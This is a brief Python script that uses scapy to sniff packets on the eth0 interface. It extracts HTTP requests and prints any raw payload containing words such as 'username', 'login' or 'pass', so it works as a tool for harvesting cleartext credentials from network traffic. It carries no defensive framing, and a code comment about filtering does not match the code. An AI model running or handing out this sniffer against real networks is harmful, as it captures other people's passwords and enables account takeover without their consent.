#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    # the filter is WHAT files, videos, and URLS you want to fitler. FOr example, the udp packets is used to catch
    # files, and videos
    scapy.sniff(iface=interface, store=False, prn=packet_sniffer)


def packet_sniffer(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            load = str(packet[scapy.Raw].load)
            keywords = ["username", "user", "login", "pass"]
            for keyword in keywords:
                if keyword in load:
                    print(load)
                    break


sniff("eth0")
